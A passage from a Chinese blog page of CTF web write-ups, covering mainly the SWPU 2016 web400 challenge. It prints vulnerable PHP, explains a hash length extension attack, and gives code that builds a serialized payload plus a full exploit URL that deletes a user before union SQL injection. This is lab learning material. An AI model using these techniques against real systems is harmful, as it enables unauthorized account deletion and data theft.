<span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));
<span class="hljs-title function_ invoke__">mysql_close</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))
{

    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>])
    {
        <span class="hljs-variable">$check</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>]));
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">'name'</span>];
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location:/web/repass.php?username=<span class="hljs-subst">$name</span>&amp;check=<span class="hljs-subst">$check</span>&amp;mibao=<span class="hljs-subst">$mibao</span>&amp;pass=<span class="hljs-subst">$pass</span>"</span>);
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Get salt Worng?')&lt;/script&gt;"</span>);
    }
}</code></pre>
<p>首先在forget.php页面，输入用户admin，其他随便输入，接着发送，bp抓取302跳转，会发现它显示出了salt的md5加密结果。如下所示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315120703273.png" alt="image-20240315120703273"></p>
<pre><code class="hljs scss">/repass<span class="hljs-selector-class">.php</span>?username=admin&amp;check=YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U=&amp;mibao=asd&amp;pass=asd
<span class="hljs-comment">//解密:ab4d22925d268dd6937e41edbe81e97e</span></code></pre>
<p>利用hash拓展工具破解</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121059169.png" alt="image-20240315121059169"></p>
<p>得到新hash:</p>
<p>拿到payload和生成好的md5，然后根据check的流程构造一个调用那个删除用户的接口函数，下面是构造删除当前用户的的代码：</p>
<p>对了，这里面要确定要删除用户的userid是哪一个，在用户登陆的跳转的地方用burp停一下，返回的数据里面的cookie里面有当前用户的userid(base64加密之后的数据）</p>
<p>得到这些之后构造代码：</p>
<pre><code class="hljs scss">&lt;?php
class admin {
    <span class="hljs-selector-tag">var</span> <span class="hljs-variable">$name</span>="admin";
	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$check</span>="<span class="hljs-number">6122</span>c04e8a1f3529d556199960ef2556";   <span class="hljs-comment">//要check的md5</span>
	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$data</span>="\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00";  <span class="hljs-comment">//工具生成好的可控变量(payload)</span>
        
                 
	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$method</span>="del_user";   <span class="hljs-comment">//要调用的函数</span>
	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$userid</span>="<span class="hljs-number">2</span>";  <span class="hljs-comment">//要删除的用户</span>
	
       
}
 
<span class="hljs-variable">$a</span>=new <span class="hljs-built_in">admin</span>();
<span class="hljs-variable">$api</span>=<span class="hljs-built_in">base64_encode</span>(serialize($a));
echo <span class="hljs-variable">$api</span>;</code></pre>
<pre><code class="hljs scss">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</code></pre>
<p>接着发送如下payload即可</p>
<pre><code class="hljs scss">http://node4.anna.nssctf.cn:<span class="hljs-number">28418</span>/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</code></pre>
<p>如下图所示删除成功，id也成为了未初始化变量，我们直接对id进行联合注入即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121539479.png" alt="image-20240315121539479"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121618906.png" alt="image-20240315121618906"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.xlab.app/p/16de60a6/">SWPU 2017 write-up</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/niexinming/article/details/52976923">详解2016 SWPU CTF web4</a></p>
<h1 id="gfctf-2021a-letter">[GFCTF 2021]A Letter</h1>
<p>这道题怀疑环境有问题。。。毕竟两年之久</p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/04/thm-ping-ju-shou-ji/">THM-Credentials Harvesting(凭据收集)</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/27/jwt-gong-ji-xue-xi/">JWT攻击学习</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bgift_f12"><span class="toc-text">[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bjicao"><span class="toc-text">[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasy_md5"><span class="toc-text">[SWPUCTF 2021 新生赛]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Binclude"><span class="toc-text">[SWPUCTF 2021 新生赛]include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasy_sql"><span class="toc-text">[SWPUCTF 2021 新生赛]easy_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyrce"><span class="toc-text">[SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bcaidao"><span class="toc-text">[SWPUCTF 2021 新生赛]caidao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bdo_you_know_http"><span class="toc-text">[SWPUCTF 2021 新生赛]Do_you_know_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021webftp"><span class="toc-text">[第五空间 2021]WebFTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bbabyrce"><span class="toc-text">[SWPUCTF 2021 新生赛]babyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize"><span class="toc-text">[SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload20"><span class="toc-text">[SWPUCTF 2021 新生赛]easyupload2.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload10"><span class="toc-text">[SWPUCTF 2021 新生赛]easyupload1.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup"><span class="toc-text">[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpseudoprotocols"><span class="toc-text">[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload30"><span class="toc-text">[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bhardrce"><span class="toc-text">[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Berror"><span class="toc-text">[SWPUCTF 2021 新生赛]error</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-text">[SWPUCTF 2021 新生赛]pop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bsql"><span class="toc-text">[SWPUCTF 2021 新生赛]sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bfinalrce"><span class="toc-text">[SWPUCTF 2021 新生赛]finalrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_ez_php"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_ez_phprevenge"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A5%87%E5%A6%99%E7%9A%84md5"><span class="toc-text">[SWPUCTF 2022 新生赛]奇妙的MD5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9B1z_unserialize"><span class="toc-text">[SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_rce"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_ez_unserialize"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bwhere_am_i"><span class="toc-text">[SWPUCTF 2022 新生赛]where_am_i</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bjs_sign"><span class="toc-text">[SWPUCTF 2022 新生赛]js_sign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bxff"><span class="toc-text">[SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bnumgame"><span class="toc-text">[SWPUCTF 2022 新生赛]numgame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_sql"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bwebdog1__start"><span class="toc-text">[SWPUCTF 2022 新生赛]webdog1__start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bfunny_php"><span class="toc-text">[SWPUCTF 2022 新生赛]funny_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bhardrce_3"><span class="toc-text">[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_1zpop"><span class="toc-text">[SWPUCTF 2022 新生赛]ez_1zpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bfunny_web"><span class="toc-text">[SWPUCTF 2022 新生赛]funny_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_upload"><span class="toc-text">[SWPUCTF 2022 新生赛]Ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bif_else"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]If_else</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bbabyunser"><span class="toc-text">[SWPUCTF 2021 新生赛]babyunser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Brce-plus"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]RCE-PLUS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bpingpingping"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]Pingpingping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nssctf-2022-spring-recruitbabysql"><span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gfctf-2021baby_web"><span class="toc-text">[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B%E4%B8%80%E9%94%AE%E8%BF%9E%E6%8E%A5"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]一键连接!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bfile_master"><span class="toc-text">[SWPUCTF 2022 新生赛]file_master</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">php短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bnss_http_cheker"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]NSS_HTTP_CHEKER</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpu-2018simplephp"><span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Buns3rialize"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]UnS3rialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bez_talk"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]ez_talk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bnss%E5%A4%A7%E5%8D%96%E5%9C%BA"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]NSS大卖场</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gfctf-2021ez_calc"><span class="toc-text">[GFCTF 2021]ez_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bpower"><span class="toc-text">[SWPUCTF 2022 新生赛]Power!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B%E6%9F%A5%E6%9F%A5need"><span class="toc-text">[SWPUCTF 2023 秋季新生赛]查查need</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gfctf-2021%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-text">[GFCTF 2021]文件查看器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#utf-16le%E7%BC%96%E7%A0%81"><span class="toc-text">utf-16le编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ucs-2%E7%BC%96%E7%A0%81"><span class="toc-text">UCS-2编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpu-2016web7"><span class="toc-text">[SWPU 2016]web7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#swpu-2016web400"><span class="toc-text">[SWPU 2016]web400</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gfctf-2021a-letter"><span class="toc-text">[GFCTF 2021]A Letter</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
